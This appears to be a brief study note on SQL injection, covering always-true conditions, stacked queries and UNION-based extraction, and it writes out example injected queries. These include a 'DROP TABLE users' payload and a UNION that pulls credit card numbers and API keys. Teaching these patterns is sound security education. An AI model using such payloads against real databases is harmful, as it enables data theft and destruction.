### Injection Attacks



#### Always true attack
select username, password from user where user_id = 'Jay' OR 1=1
select username, password from user where user_id = 'Jay' OR true
select username, password from user

Example: 

SELECT id, username, is_admin, email  FROM users WHERE username = 'admin' OR '1'='1' AND password = 'asjdfasdlfjalsjdfla'
SELECT id, username, is_admin, email  FROM users WHERE (username = 'admin') OR ('1'='1' AND password = 'asjdfasdlfjalsjdfla')
SELECT id, username, is_admin, email  FROM users WHERE (username = 'admin') OR (true AND false)
SELECT id, username, is_admin, email  FROM users WHERE (username = 'admin') OR false
SELECT id, username, is_admin, email  FROM users WHERE username = 'admin' 


### Query Stacking Attack
IN SQL ; is a delimeter for a statment

SELECT * from books where bookId = 1; DROP users;

Example: 
INSERT INTO blog_posts (id, title, content) VALUES (5, 'Hello World 2', 'test'); DROP TABLE users; --')



### Union / Data exfilteration attack
SELECT username, email FROM users WHERE username = 'admin' 
UNION 
SELECT credit_card, api_key FROM users WHERE '1'='1';